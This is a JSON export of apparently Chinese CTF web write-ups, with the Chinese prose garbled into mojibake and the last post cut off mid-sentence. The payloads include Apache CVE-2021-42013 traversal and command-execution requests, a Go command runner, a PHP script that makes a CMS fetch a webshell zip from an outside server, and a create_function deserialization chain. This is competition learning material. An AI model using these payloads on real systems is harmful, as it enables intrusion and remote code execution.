[{"title":"2022DASCTF MAY å‡ºé¢˜äººæŒ‘æˆ˜èµ› web","url":"/2022/12/06/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-web/","content":"Power Cookie\næç¤ºï¼šåªæœ‰adminæ‰å¯ä»¥è·å–flag\n\nä¾æ®æç¤ºå¯ä»¥çŒœæµ‹ï¼Œæœ¬é¢˜å¯èƒ½éœ€è¦é€šè¿‡ä¿®æ”¹cookieå€¼æ¥è·å–flagã€‚ä½¿ç”¨Burp SuiteæŠ“åŒ…æŸ¥çœ‹ResponseåŒ…å‘ç°admin=0äºæ˜¯åœ¨RequeståŒ…ä¸­åŠ å…¥Cookie: admin=1\næˆåŠŸå¾—åˆ°flagï¼\n\n\næœ¬é¢˜åšé¢˜è¿‡ç¨‹åˆå§‹ï¼Œåšä¸»å°†Cookie: admin=1æ’åœ¨äº†è¯·æ±‚åŒ…çš„æœ«å°¾ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰å¯¼è‡´å§‹ç»ˆæ— å“åº”ï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°headeråŒ¹é…åˆ°Upgradeæ—¶å°†è¢«ç»ˆæ­¢ï¼Œè°ƒæ•´ä½ç½®åæˆåŠŸè§£å†³ï¼ŒåŸå› åº¶å‡ å¦‚æ­¤ï¼ˆè¯·æ±‚å¤´ headerä¸­ä¼ cookieä¸ç”Ÿæ•ˆåŸå› ï¼‰\n\n\n\né­”æ³•æµè§ˆå™¨è¿›å…¥åå¾—åˆ°æç¤ºï¼š\n\næç¤ºï¼šflag.txtä¸ºä¿è¯æ–‡æ¡£å®‰å…¨ã€‚è¯·ä½¿ç”¨é­”æ³•æµè§ˆå™¨æ¥è®¿é—®ã€‚\n\nä¸æ˜æ‰€ä»¥ï¼ŒF12æŸ¥çœ‹å¾—åˆ°è¿›ä¸€æ­¥æç¤ºï¼Œéœ€è¦let ua = &quot;\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30 \\x28\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73 \\x4e\\x54 \\x31\\x30\\x2e\\x30\\x3b \\x57\\x69\\x6e\\x36\\x34\\x3b \\x78\\x36\\x34\\x29 \\x41\\x70\\x70\\x6c\\x65\\x57\\x65\\x62\\x4b\\x69\\x74\\x2f\\x35\\x33\\x37\\x2e\\x33\\x36 \\x28\\x4b\\x48\\x54\\x4d\\x4c\\x2c \\x6c\\x69\\x6b\\x65 \\x47\\x65\\x63\\x6b\\x6f\\x29 \\x4d\\x61\\x67\\x69\\x63\\x2f\\x31\\x30\\x30\\x2e\\x30\\x2e\\x34\\x38\\x39\\x36\\x2e\\x37\\x35&quot;ç»“åˆâ€œä½¿ç”¨é­”æ³•æµè§ˆå™¨â€å¯ä»¥çŒœæƒ³åˆ°åº”è¯¥å°†è¯·æ±‚æŠ¥æ–‡ä¸­çš„User-Agentä¿®æ”¹ä¸ºå…¶è¦æ±‚çš„â€œMagicâ€å†…å®¹\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75\n\nå‘é€ï¼ŒæˆåŠŸå¾—åˆ°flag\n[çœ‹å…¶ä»–å¸ˆå‚…çš„wpæ—¶å‘ç°å¯ä»¥ç”¨consoleæ‰§è¡Œjsï¼Œè€Œä¸ç”¨å»utf-8è½¬ç ï¼Œåˆå­¦åˆ°äº†ä¸€ç‚¹]\n\n\ngetmeF12æŸ¥çœ‹ï¼Œä¸€è„¸æ‡µé€¼é™¤äº†ä¸€è¡Œè·¯å¾„pwd:/usr/local/apache2/ï¼Œå¾—çŸ¥å…¶æ˜¯apacheï¼Œåˆ«æ— å…¶å®ƒä¿¡æ¯ã€‚æŠ“åŒ…æŸ¥çœ‹è¿”å›åŒ…ï¼šåªèƒ½è¯´â€œé»”é©´æŠ€ç©·â€ã€‚ä¹‹åæŸ¥æ‰¾å¸ˆå‚…ä»¬çš„wpå’Œç½‘ä¸Šçš„å„ç§èµ„æ–™ï¼Œå¾—çŸ¥**Apache&#x2F;2.4.50 (Unix)**ç‰ˆæœ¬å­˜åœ¨ä»»æ„è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆè¿™æ—¶å†å›æƒ³èµ·ä¸€å¼€å§‹çš„é‚£ä¸€è¡Œè·¯å¾„ï¼Œæˆ–è®¸ä¹Ÿæ˜¯åœ¨æç¤ºè¿™ä¸€ç‚¹ç½¢ï¼‰ã€‚[ Apache è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2021-42013ï¼‰]ç›´æ¥æ‰¾åˆ°CVEï¼Œç”¨pocå’Œexpå»æ‰“\n\n&#x2F;&#x2F;æŸ¥çœ‹ä»»æ„æ–‡ä»¶GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1\n\n(è‹¥å°†etc/passwdæ”¹ä¸ºflagï¼Œåˆ™å¯è¯»å–åˆ°flagï¼Œä¸è¿‡æ˜¯å‡çš„ï¼Œæˆ‘ä»¬åé¢å†çœ‹)\n\n&#x2F;&#x2F;æ‰§è¡Œä»»æ„å‘½ä»¤GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1\n\næˆ‘ä»¬åˆ©ç”¨expå’ŒBurp Suiteå‘é€å‘½ä»¤echo Content-Type: text/plain; echo;ls / //è¿™é‡Œçš„Content-Type: text/plain è§„å®šå°†æ–‡ä»¶è®¾ç½®ä¸ºçº¯æ–‡æœ¬çš„å½¢å¼\n\n\nä»è€ŒæŸ¥çœ‹åˆ°æ‰€æœ‰çš„æ–‡ä»¶åï¼Œåœ¨å…¶ä¸­å‘ç°flagï¼Œè¯•å›¾echo;cat /flagè¯»å–ç»“æœå‘ç°ä¸ºå‡ï¼Œåªèƒ½ä»å…¶ä»–çš„æ–‡ä»¶ä¸‹æ‰‹ï¼Œè¿™é‡Œå‡­è¿æ°”é€‰ä¸€ä¸ªæœ€å¥‡æ€ªçš„diajgkï¼Œç„¶åä¸€å±‚å±‚æŸ¥çœ‹ï¼Œæœ€ç»ˆåœ¨ç¬¬å››å±‚å‘ç°ä¸€ä¸ªè²Œä¼¼flagçš„æ–‡ä»¶ï¼Œcatè¯»å–å¾—åˆ°flag\n\nè¿™ä¸€é¢˜æœ‰ä¸‰ä¸ªé—®é¢˜åœ¨è€—è´¹äº†å¤§é‡çš„æ—¶é—´ï¼Œéœ€è¦æ‰¾æ—¶é—´å†å»ç†è§£æ¸…æ™°ï¼š1ã€åœ¨æ‰¾flagçš„ç‚¹ä¸Šå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå¦‚æœè¦ä¸€ä¸ªä¸ªå»æŠŠæ–‡ä»¶éƒ½è¯•ä¸€éæœªå…è¿‡äºç¦»è°±ã€‚åœ¨æ‰¾åŠæ³•çš„è¿‡ç¨‹ä¸­å‘ç°ä¸€ä½å¸ˆå‚…é€šè¿‡åˆ†ææŸ¥çœ‹æ—¥å¿—çš„åŠæ³•æ‰¾åˆ°æœ€ç»ˆçœŸæ­£çš„flagçš„è·¯å¾„ï¼Œä¸è¿‡å› ä¸ºä¸çŸ¥é“å…¶ä½¿ç”¨äº†æ€ä¹ˆæ ·çš„å‘½ä»¤è€Œæ— æ³•å¤ç°ï¼ˆç‚¹å‡»å›¾ç‰‡å¯è·³è½¬åˆ°è¿™ä½å¸ˆå‚…çš„åšå®¢ï¼‰2ã€å¦‚ä½•è¿ç”¨è¯¥expå»æ‰§è¡Œæ›´å¤šå…¶ä»–çš„å‘½ä»¤ï¼Œæœ‰ä½•è§„èŒƒï¼Ÿï¼ˆæˆ‘è‡ªå·±å°è¯•çš„cdã€tailç­‰å‡æ— æ•ˆï¼‰3ã€echoæœ‰ä»€ä¹ˆä½œç”¨ï¼Œä¸åˆ†å·è”åˆæ€æ ·ä½¿ç”¨ï¼Ÿ\n\n\nhackmeè¿™é¢˜ä¸å‡ºæ„å¤–çš„æ²¡æœ‰ä»€ä¹ˆæ€è·¯ï¼Œå‘ç°GOTOLISTæ˜¯å¯ä»¥ç‚¹å‡»çš„é“¾æ¥ï¼Œé‡Œé¢åˆæœ‰8ä¸ªé“¾æ¥ï¼Œä¸€ä¸ªä¸ªç‚¹è¿›å»ï¼Œæ²¡æœ‰å¤´ç»ªï¼Œå¥‡æ€ªçš„æ˜¯usersç‚¹è¿›å»å‡ºç°äº†è¿™æ ·ä¸€å¥ï¼š\n\nSorry there doesnâ€™t seem to be a users.go file\n\nåˆç»“åˆæœ€åä¸€ä¸ªé“¾æ¥â€”â€”ä¸Šä¼ ä¸€ä¸ª**.goæ–‡ä»¶ï¼ŒçŒœæµ‹éœ€è¦ç”¨è¯¥é“¾æ¥ä¸Šä¼ ä¸€ä¸ªåå«users.go**çš„goæ–‡ä»¶ï¼Œç„¶åç‚¹å‡»usersæ‰§è¡Œæ–‡ä»¶ã€‚ç„¶è€Œåšä¸»å¹¶ä¸çŸ¥é“ä»€ä¹ˆæ˜¯goæ–‡ä»¶ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œç»§ç»­æ‡µé€¼ç€å»ç¿»å¤§ä½¬ä»¬çš„wpï¼Œå¾—çŸ¥å¯ä»¥æ‰¾åˆ°æ‰§è¡Œå‘½ä»¤çš„goè„šæœ¬ os&#x2F;exec æ‰§è¡Œå‘½ä»¤çš„äº”ç§å§¿åŠ¿ï¼\né€‰æ‹©æ‰§è¡Œå‘½ä»¤å¹¶ä¸”èƒ½è·å–ç»“æœçš„åŠæ³•\npackage mainimport (&quot;fmt&quot;&quot;log&quot;&quot;os/exec&quot;)func main() &#123;    cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)    out, err := cmd.CombinedOutput()    if err != nil &#123;        fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out))        log.Fatalf(&quot;cmd.Run() failed with %s\\n&quot;, err)    &#125;    fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out))&#125;\n\nå‘ç°æˆåŠŸæ‰§è¡Œäº†ls /å‘½ä»¤ä¸”æˆåŠŸæ‰¾åˆ°äº†è—èµ·æ¥çš„flagï¼Œå°†cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)æ›´æ”¹ä¸ºcmd := exec.Command(&quot;cat&quot;,&quot;/flag&quot;)æˆåŠŸè·å–flagï¼\n\n\nezcmsä¸‹è½½æ–‡ä»¶åï¼Œå‘ç°æœ‰admin.phpæ–‡ä»¶\nå¾—çŸ¥è¯¥ç½‘ç«™å­˜åœ¨åå°ï¼Œå¯¹æ–‡ä»¶å…¨å±€æœç´¢â€œå¯†ç â€ï¼Œç¢°å·§å‘ç°\n\n\nç”¨admin 123456æˆåŠŸç™»å…¥åå°ã€‚é€›äº†ä¸€åœˆï¼Œèƒ½ç‚¹çš„éƒ½ç‚¹äº†ä¸€éï¼Œæ²¡å‘ç°ä»€ä¹ˆå¯åˆ©ç”¨çš„ä¿¡æ¯ã€‚äºæ˜¯ä¸€ä¸ªä¸ªç¿»çœ‹æºç ï¼Œå¯æ˜¯åšä¸»ä¸å¤Ÿæ•é”ï¼Œæ²¡èƒ½å‘ç°å­˜åœ¨ç€Update.phpå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œåæ¥æŸ¥çœ‹å…¶ä»–å¤§ä½¬çš„wpæ‰å›è¿‡ç¥æ¥ï¼šå—¯ï¼Œåœ¨adminæ–‡ä»¶å¤¹é‡Œï¼Œç¡®å®åº”è¯¥å†ä»”ç»†çœ‹ä¸€çœ‹ã€‚\n\n\nè¿™æ®µä»£ç å‘Šè¯‰æˆ‘ä»¬ï¼Œåœ¨è¿™ä¸ªé¡µé¢ï¼Œå¯ä»¥ç”¨GETæ–¹å¼ä¼ urlå€¼ï¼Œç„¶åè¯¥urlç»sys_auth()å‡½æ•°å¤„ç†åå°±ä¼šè¢«ä¸‹è½½ï¼Œåˆ¤æ–­Content-Typeå€¼ä¸ºapplication/zipå°±ä¼šè¢«è§£å‹ï¼Œç„¶åè¾“å‡º ç‰ˆæœ¬å‡çº§æˆåŠŸ~\näºæ˜¯è€ƒè™‘sys_auth()å‡½æ•°ä½œä½•ç”¨å¤„â€”â€”åŠ å¯†æˆ–è§£å¯†ä¸”å¯åˆ¤æ–­ï¼Œå½“type=0æ—¶åŠ å¯†ï¼Œä¼ å…¥type=1ä¸ºè§£å¯†ã€‚é‚£ä¹ˆå°±æ€è·¯ä¾¿æ˜ç¡®äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨vpsä¸Šéƒ¨ç½²ä¸€ä¸ªâ€œä¸€å¥è¯æœ¨é©¬â€çš„å‹ç¼©æ–‡ä»¶ï¼ˆ.zipï¼‰ï¼Œå¾—åˆ°webshell.zipçš„urlï¼Œç„¶åå°†è¯¥urlç”¨æºç ä¸­çš„sys_auth()åŠ å¯†ï¼Œæœ€åä»¥GETæ–¹å¼æŠŠåŠ å¯†åçš„urlä¸Šä¼ å³å¯ï¼Œå…·ä½“å®ç°å¦‚ä¸‹ï¼š\n&lt;?phpdefine(&#x27;Mc_Encryption_Key&#x27;,&#x27;GKwHuLj9AOhaxJ2&#x27;);//å­—ç¬¦åŠ å¯†ã€è§£å¯† [0ä¸ºåŠ å¯†ï¼Œ1ä¸ºè§£å¯†]function sys_auth($string, $type = 0, $key = &#x27;&#x27;, $expiry = 0) &#123;\tif(is_array($string)) $string = json_encode($string);\tif($type == 1) $string = str_replace(&#x27;-&#x27;,&#x27;+&#x27;,$string);\t$ckey_length = 4;\t$key = md5($key ? $key : Mc_Encryption_Key);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = &#x27;&#x27;;\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i &lt;= 255; $i++) &#123;\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t&#125;\tfor($j = $i = 0; $i &lt; 256; $i++) &#123;\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t&#125;\tfor($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t&#125; \tif($type == 1) &#123;\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;\t\t\t$result = substr($result, 26);\t\t\t$json = json_decode($result,1);\t\t\tif(!is_numeric($result) &amp;&amp; $json)&#123;\t\t\t\treturn $json;\t\t\t&#125;else&#123;\t\t\t\treturn $result;\t\t\t&#125;\t\t&#125;\t\treturn &#x27;&#x27;;\t&#125;\treturn str_replace(&#x27;+&#x27;, &#x27;-&#x27;, $keyc.str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result)));&#125;//ä»¥ä¸‹ä¸ºåˆ©ç”¨æºç å‡½æ•°è¿›è¡ŒsysåŠ å¯†$ans=sys_auth(&quot;http://ip.ip.ip.ip/acmd.zip&quot;);//æˆ‘ä¸Šä¼ çš„webshellå‹ç¼©æ–‡ä»¶åä¸ºacmd.zipvar_dump($ans);?&gt;\n\nåˆ©ç”¨å¦‚ä¸Šexpå¾—åˆ°åŠ å¯†çš„urlï¼š\n\näº‹å®ä¸Šåšä¸»ç¬¬ä¸€æ¬¡å¤±è´¥äº†ï¼Œå‘ç°åŸæ¥ä»£ç é‡Œè¿˜å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€å˜é‡è·Ÿè¸ªæŸ¥æ‰¾å³å¯ä»¥æ‰¾åˆ°define(&#39;Mc_Encryption_Key&#39;,&#39;GKwHuLj9AOhaxJ2&#39;);åŠ ä¸Šè¿™å¥å®šä¹‰åæˆåŠŸ\n\nstring(79) &quot;498bUpfpc2DVbWQdqxFIo8gRcC76FVJksWQcRwY5OCDSBXHMEF3zd07OYVMsJekRsip5UY2acffwS1Q&quot;æ‹¿åˆ°åŠ å¯†urlåç›´æ¥ä¸Šä¼ ï¼š\næˆåŠŸï¼æ¥ä¸‹æ¥ï¼Œæˆ‘ä¾¿å¼€å§‹è¯•å›¾åœ¨update.phpæºç ä¸­æ‰¾åˆ°æ–‡ä»¶ä¸‹è½½æˆ–è§£å‹åæ‰€åœ¨çš„ä½ç½®ï¼Œæ­¤é—´è·Ÿè¸ªäº†å‡ ä¸ªç±»ã€å‡½æ•°å¦‚mczip-&gt;PclZip()ç»“æœå¹¶æ²¡æœ‰åˆ†æå‡ºä»€ä¹ˆæ¥ï¼Œåªå¾—å†å»ç¿»çœ‹å…¶ä»–å¸ˆå‚…çš„wpï¼Œå‘ç°ä»–ä»¬çš„åé—¨å°±åœ¨æ ¹ç›®å½•ä¸‹ï¼Œäºæ˜¯èšå‰‘ğŸ—¡è¿æ¥ï¼Œflagè¿˜æ˜¯åœ¨æ ¹ç›®å½•ä¸‹:\n\n\næ‰“å¼€åæˆåŠŸå¾—åˆ°flagDASCTF&#123;86527acc-676d-4267-a1a1-b46337a3a2a6&#125;\n\nè¿™é¢˜äºæˆ‘è€Œè¨€å¾ˆæ‰¯æ·¡çš„ç‚¹å°±æ˜¯vpséƒ¨ç½²å’Œè§£å‹ç›®å½•æŸ¥æ‰¾ï¼Œä¸€å¼€å§‹æˆ‘è„‘å­æœ‰ç‚¹è¿›æ·¼ç«Ÿç„¶ç”¨æœ¬åœ°çš„PHP studyæ­å»ºçš„ç½‘ç«™ä¸Šä¼ å‹ç¼©åŒ…â€¦â€¦ç»“æœå½“ç„¶å°±æ˜¯å¤±è´¥ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯å‹ç¼©åŒ…ä¸zipç±»å‹æ–‡ä»¶æˆ‘ç›´æ¥å‚»æ‰ï¼Œä¸€ç›´åœ¨æƒ³å¦‚ä½•æŠŠå‹ç¼©åŒ…çš„content typeç±»å‹è°ƒæˆä»–è¦æ±‚çš„zipï¼Œå®Œå…¨å¿½ç•¥äº†ä»–æ ¹æœ¬è¿›ä¸äº†æˆ‘çš„æœ¬åœ°ç«™ç‚¹â€¦åæ¥éƒ¨ç½²åœ¨vpsä¸ŠæˆåŠŸå¾—ä»¥è§£å†³ï¼›è‡³äºç¬¬äºŒç‚¹ä»éœ€è¦å­¦ä¹ ï¼Œå¸Œæœ›å¤šæŒ‡æ•™~\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2022DASCTF Sept X æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ› web","url":"/2022/12/06/2022DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/","content":"hellounserç›´æ¥å¯è¯»æºç \n&lt;?phpclass A &#123;    public $var;    public function show()&#123;        echo $this-&gt;var;    &#125;    public function __invoke()&#123;        $this-&gt;show();    &#125;&#125;class B&#123;    public $func;    public $arg;        public function show()&#123;        $func = $this-&gt;func;        if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $this-&gt;arg)) &#123;             die(&#x27;No!No!No!&#x27;);         &#125; else &#123;             include &quot;flag.php&quot;;            //There is no code to print flag in flag.php            $func(&#x27;&#x27;, $this-&gt;arg);         &#125;    &#125;        public function __toString()&#123;        $this-&gt;show();        return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;    &#125;        &#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    $aaa = unserialize($_GET[&#x27;pop&#x27;]);    $aaa();&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\nå®¡è®¡ä»£ç å‘ç°éœ€è¦GETæ–¹å¼ä¼ å…¥â€popâ€ï¼Œç„¶åç»ååºåˆ—åŒ–åè¢«è°ƒç”¨ã€‚Aç±»ä¸­çš„_invoke()é­”æœ¯æ–¹æ³•èƒ½åœ¨Aç±»è¢«è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œä»è€Œè°ƒç”¨show()å‡½æ•°ï¼Œè¾“å‡º$varï¼Œè€ŒBç±»ä¸­çš„_toString()é­”æœ¯æ–¹æ³•èƒ½åœ¨Bç±»è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ï¼Œè‹¥è®©$var=Bç±»ï¼Œåˆ™_toString()è¢«è§¦å‘æ—¶è°ƒç”¨Bçš„show()å‡½æ•°ã€‚æŸ¥çœ‹Bç±»ä¸­show()å‡½æ•°ï¼Œfuncã€argè¢«ç»•è¿‡ååˆ™å¯åŒ…å«â€flag.phpâ€æ–‡ä»¶ï¼Œæ³¨é‡Šä¸­æåˆ°ä¸ä¼šè¾“å‡ºï¼Œä¾¿åªèƒ½ä¾èµ–$funcå‡½æ•°â€”â€”æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸”èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¯åˆ©ç”¨cretae_functionï¼Œæ—¢ç»•è¿‡äº†funcçš„åŒ¹é…ï¼Œåˆå¯ä»¥æ‰§è¡Œï¼ˆè¿™é‡Œéœ€è¦ç”¨&#125;é—­åˆå‡½æ•°ï¼‰ã€‚ç”±æ­¤æ„é€ å¦‚ä¸‹ä»£ç \n$a=new A();$b=new B();$b-&gt;func=&quot;create_function&quot;;$b-&gt;arg=&quot;&#125;var_dump(get_defined_vars());//&quot;;$a-&gt;var=$b;echo urlencode(serialize($a));\n\nä¼ å…¥â€ cretae_functionâ€ä½œä¸º$å‡½æ•°åï¼Œç„¶åå°†&quot;&#125;var_dump(get_defined_vars());//&quot;ä¼ å…¥argï¼Œä»è€Œç»•è¿‡äº†åŒ¹é…å¹¶æ‰§è¡Œ$func(&#39;&#39;, $this-&gt;arg); ï¼Œç›¸å½“äºæ‰§è¡Œå¦‚ä¸‹ä»£ç \ncreate_function(&quot;&quot;,&#125;var_dump(get_defined_vars());//)ä¹Ÿå³---------&gt;cfunction(&quot;&quot;)&#123;&#125;var_dump(get_defined_vars());//&#125;\n\nè¿™é‡Œçš„var_dump()å‡½æ•°å¯ä»¥è¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ï¼Œæ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ï¼ˆå…¶ä¸­æ•°ç»„ä¼šé€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ï¼‰ï¼›è€Œget_defined_vars()å‡½æ•°èƒ½è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªå‡½æ•°èƒ½çœ‹åˆ°æ‰€æœ‰å·²å®šä¹‰å˜é‡ã€‚ç»ä»¥ä¸Šä»£ç æ‰§è¡Œä¾¿å¯å¾—åˆ°åºåˆ—åŒ–$açš„urlç¼–ç ï¼Œä¼ å…¥åå¾—åˆ°å‘ç°çœŸæ­£çš„flagè—åœ¨ä¸€ä¸ªå«Tru3flag.phpçš„æ–‡ä»¶é‡Œï¼Œå› æ­¤base64ç»•è¿‡åï¼Œç”¨require()å‡½æ•°åŒ…å«æ‰§è¡Œ[æˆ–è€…catæŸ¥çœ‹ç”¨å–åç»•è¿‡çš„åŠæ³•]require(base64_decode(VHJ1M2ZsYWcucGhw));ä¿®æ”¹åçš„å®Œæ•´ä»£ç å¦‚ä¸‹\nclass A &#123;    public $var;    public function show()&#123;        echo $this-&gt;var;    &#125;    public function __invoke()&#123;        $this-&gt;show();    &#125;&#125;class B&#123;    public $func;    public $arg;        public function show()&#123;        $func = $this-&gt;func;        if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $this-&gt;arg)) &#123;             die(&#x27;No!No!No!&#x27;);         &#125; else &#123;             include &quot;flag.php&quot;;            //There is no code to print flag in flag.php            $func(&#x27;&#x27;, $this-&gt;arg);         &#125;    &#125;        public function __toString()&#123;        $this-&gt;show();          return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;    &#125; &#125;$a=new A();$b=new B();$b-&gt;func=&quot;create_function&quot;;$b-&gt;arg=&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;;$a-&gt;var=$b;/*create_function(&quot;&quot;,&#125;var_dump(get_defined_vars());//)---------&gt;cfunction(&quot;&quot;)&#123;&#125;var_dump(get_defined_vars());//&#125;*/echo urlencode(serialize($a));?&gt;\n\nå¾—åˆ°flag\n\né™„ç»å¸¸ä½¿ç”¨åˆ°çš„é­”æœ¯æ–¹æ³•ï¼ˆæ¥è‡ª phpååºåˆ—åŒ–æ¼æ´ä¹‹POPé“¾æ„é€ ï¼‰\n__construct()  //å½“å¯¹è±¡åˆ›å»ºæ—¶è§¦å‘__destruct()   //å½“å¯¹è±¡é”€æ¯æ—¶è§¦å‘__wakeup()     //å½“ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep()     //å½“ä½¿ç”¨serializeæ—¶è§¦å‘__destruct()  //å½“å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call()      //å½“å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get()       //å½“è®¿é—®ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘__set()       //å½“è®¾ç½®ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è§¦å‘__toString()  //å½“æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke()    //å½“å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2022Dest0g3-520è¿æ–°èµ›-web(1-5é¢˜)","url":"/2022/12/06/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web(1-5%E9%A2%98)/","content":"phpdestæ”¾å‡ºæºç ï¼š\n&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;    require_once($_GET[&#x27;file&#x27;]);&#125;\n\nè¿™ä¸€æ¬¡æ˜¯å¯¹require_once()å‡½æ•°çš„è€ƒæŸ¥ï¼Œå…¶è°ƒç”¨æ—¶phpä¼šæ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯åˆ™ä¸ä¼šå†æ¬¡åŒ…å«ï¼Œäºæ˜¯æˆ‘ä»¬å¿…é¡»æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼Œä»è€Œå®ç°å†æ¬¡åŒ…å«æ–‡ä»¶flag.php.\nä¸Šä¸€æ¬¡æˆ‘ä»¬å­¦ä¹ åˆ°phpä¼ªåè®®ï¼Œç»“åˆä¸‹é¢è¿™ä¸ªçŸ¥è¯†ç‚¹\n/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/ï¼Œ/proc/self/root/æ˜¯æŒ‡å‘/çš„ç¬¦å·é“¾æ¥\n\næˆ‘ä»¬å°±å¯ä»¥ç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ï¼Œç›´æ¥æ„é€ 